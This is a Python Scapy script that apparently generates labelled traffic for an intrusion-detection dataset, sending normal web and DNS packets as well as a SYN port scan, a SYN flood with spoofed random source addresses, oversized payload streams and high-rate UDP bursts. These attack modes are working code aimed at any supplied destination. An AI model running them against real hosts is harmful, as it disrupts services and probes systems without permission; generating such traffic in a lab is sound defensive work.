#!/usr/bin/env python3
"""
generator.py — Synthetic traffic generator (Normal + Malicious)

- Works with any interface: --iface auto|en0|lo0|...
- Normal: web (TCP handshake + GETs), dns (UDP DNS query)
- Malicious: scan (SYN scan), synflood, abnsize (large payloads), burst (UDP PPS)

This ONLY sends traffic. If you want a pcap for your teammate's dataset tool,
run a capture separately (e.g., `sudo tshark -i lo0 -w out.pcap`) while this runs.

Safety: Only use in an isolated lab where you have permission.
"""

import argparse, random, time
from scapy.all import (
    conf, get_if_list, IP, IPv6, TCP, UDP, DNS, DNSQR, Raw,
    RandShort, RandIP, sr1, send
)

# ---------- Interface selection ----------
def pick_iface_for_dst(dst=None, requested_iface=None):
    """
    Choose an interface for Scapy L3 I/O.
    - If user supplies a valid iface -> use it.
    - If 'auto' or None -> pick via kernel routing to dst (or 8.8.8.8 fallback).
    """
    if requested_iface and requested_iface.lower() not in ("auto", "", "none"):
        if requested_iface not in get_if_list():
            raise ValueError(f"Interface '{requested_iface}' not found. Available: {get_if_list()}")
        conf.iface = requested_iface
        return conf.iface

    # route-driven choice
    try:
        if not dst:
            dst = "8.8.8.8"
        r = conf.route.route(dst)  # (iface, gw, src)
        if r and r[0]:
            conf.iface = r[0]
            return conf.iface
    except Exception:
        pass

    # fallback
    if conf.iface:
        return conf.iface
    ifaces = get_if_list()
    if ifaces:
        conf.iface = ifaces[0]
        return conf.iface
    raise RuntimeError("No network interfaces available")

# ---------- Generators ----------
def _handshake(dst, dport, timeout=1.0):
    ip = IP(dst=dst)
    syn = TCP(dport=dport, sport=RandShort(), flags='S', seq=random.randint(0,2**32-1))
    synack = sr1(ip/syn, timeout=timeout, verbose=False)
    if not synack or not synack.haslayer(TCP):
        return None
    try:
        flags_int = int(synack[TCP].flags)
    except Exception:
        flags_int = 0
    if (flags_int & 0x12) != 0x12:  # SYN+ACK
        return None
    ack = TCP(dport=dport, sport=syn.sport, flags='A', seq=syn.seq+1, ack=synack[TCP].seq+1)
    send(ip/ack, verbose=False)
    return syn

def send_web_like(dst, dport=80, count=3, fallback_pa=True):
    """
    Try a real 3-way handshake then send HTTP-like payloads.
    If handshake fails AND fallback_pa=True, send PSH/ACK packets anyway
    so something appears in the pcap (useful on loopback/macOS).
    """
    syn = _handshake(dst, dport)
    ip = IP(dst=dst)
    if not syn:
        print("[generator] Handshake failed.", "(fallback to PSH/ACK)" if fallback_pa else "")
        if not fallback_pa:
            return
        for i in range(count):
            payload = f"GET /{i} HTTP/1.1\r\nHost:{dst}\r\n\r\n".encode()
            send(ip/TCP(dport=dport, sport=RandShort(), flags='PA')/Raw(payload), verbose=False)
            time.sleep(0.05)
        return

    for i in range(count):
        payload = f"GET /{i} HTTP/1.1\r\nHost: {dst}\r\n\r\n".encode()
        psh = TCP(dport=dport, sport=syn.sport, flags='PA', seq=syn.seq+1+i*len(payload), ack=0)
        send(ip/psh/Raw(payload), verbose=False)
        time.sleep(0.05)
    fin = TCP(dport=dport, sport=syn.sport, flags='FA', seq=syn.seq+1+count*len(payload), ack=0)
    send(ip/fin, verbose=False)
    print("[generator] web-like traffic sent")

def send_dns_query(dst, name='example.com'):
    ip = IP(dst=dst)
    udp = UDP(sport=RandShort(), dport=53)
    dns = DNS(rd=1, qd=DNSQR(qname=name))
    try:
        resp = sr1(ip/udp/dns, timeout=2.0, verbose=False)
        if resp:
            print("[generator] DNS reply received")
        else:
            print("[generator] DNS query sent (no reply observed)")
    except Exception as e:
        print("[generator] DNS error:", e)

def port_list(spec: str):
    out = []
    for part in str(spec).split(','):
        part = part.strip()
        if not part: 
            continue
        if '-' in part:
            a,b = part.split('-',1)
            out.extend(range(int(a), int(b)+1))
        else:
            out.append(int(part))
    return out

def scan(dst, ports, rate=200):
    inter = 0 if rate<=0 else 1.0/float(rate)
    cnt=0
    for p in ports:
        pkt = IP(dst=dst)/TCP(dport=p, sport=RandShort(), flags='S', seq=random.randint(0,2**32-1))
        send(pkt, verbose=False)
        cnt+=1
        if inter>0:
            time.sleep(inter)
    print(f"[generator] SYN scan sent: {cnt} ports @~{rate} pps")

def syn_flood(dst, dport, pps=500, seconds=3):
    inter = 0 if pps<=0 else 1.0/pps
    end = time.time()+seconds
    cnt=0
    while time.time()<end:
        pkt = IP(dst=dst, src=str(RandIP()))/TCP(dport=dport, sport=RandShort(), flags='S', seq=random.randint(0,2**32-1))
        send(pkt, verbose=False)
        cnt+=1
        if inter>0:
            time.sleep(inter)
    print(f"[generator] SYN flood: ~{cnt} SYNs over {seconds}s")

def abnormal_sizes(dst, dport, size=1400, count=50):
    syn = _handshake(dst, dport)
    ip = IP(dst=dst)
    if not syn:
        print("[generator] Handshake failed; skipping abnormal-size stream.")
        return
    for i in range(count):
        payload = bytes([0x41])*max(1,size)
        send(ip/TCP(dport=dport, sport=syn.sport, flags='PA', seq=syn.seq+1+i*size)/Raw(payload), verbose=False)
        time.sleep(0.01)
    print("[generator] abnormal payloads sent")

def burst_udp(dst, dport, pps=2000, seconds=3):
    inter = 0 if pps<=0 else 1.0/pps
    end = time.time()+seconds
    cnt=0
    while time.time()<end:
        send(IP(dst=dst)/UDP(dport=dport, sport=RandShort())/Raw(b'B'*32), verbose=False)
        cnt+=1
        if inter>0:
            time.sleep(inter)
    print(f"[generator] UDP burst: ~{cnt} packets over {seconds}s")

# ---------- CLI ----------
def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--iface', default='auto', help='Interface (name) or "auto"')
    sub = ap.add_subparsers(dest='mode', required=True)

    w = sub.add_parser('web'); w.add_argument('--dst', required=True); w.add_argument('--dport', type=int, default=80); w.add_argument('--count', type=int, default=3)
    d = sub.add_parser('dns'); d.add_argument('--dst', required=True); d.add_argument('--name', default='example.com')
    s = sub.add_parser('scan'); s.add_argument('--dst', required=True); s.add_argument('--ports', required=True); s.add_argument('--rate', type=int, default=200)
    f = sub.add_parser('synflood'); f.add_argument('--dst', required=True); f.add_argument('--dport', type=int, required=True); f.add_argument('--pps', type=int, default=500); f.add_argument('--seconds', type=int, default=3)
    a = sub.add_parser('abnsize'); a.add_argument('--dst', required=True); a.add_argument('--dport', type=int, required=True); a.add_argument('--size', type=int, default=1400); a.add_argument('--count', type=int, default=50)
    b = sub.add_parser('burst'); b.add_argument('--dst', required=True); b.add_argument('--dport', type=int, required=True); b.add_argument('--pps', type=int, default=2000); b.add_argument('--seconds', type=int, default=3)

    args = ap.parse_args()
    # choose iface (uses dst for routing if provided)
    try:
        chosen = pick_iface_for_dst(getattr(args,'dst',None), args.iface)
        print(f"[scapy] Using interface: {chosen}")
        try:
            print("[scapy] Route:", conf.route.route(getattr(args,'dst','8.8.8.8')))
        except Exception:
            pass
    except Exception as e:
        print("[error] Interface selection failed:", e)
        raise SystemExit(1)

    # dispatch
    if args.mode=='web':
        send_web_like(args.dst, args.dport, args.count)
    elif args.mode=='dns':
        send_dns_query(args.dst, args.name)
    elif args.mode=='scan':
        scan(args.dst, port_list(args.ports), args.rate)
    elif args.mode=='synflood':
        syn_flood(args.dst, args.dport, args.pps, args.seconds)
    elif args.mode=='abnsize':
        abnormal_sizes(args.dst, args.dport, args.size, args.count)
    elif args.mode=='burst':
        burst_udp(args.dst, args.dport, args.pps, args.seconds)

if __name__ == '__main__':
    main()
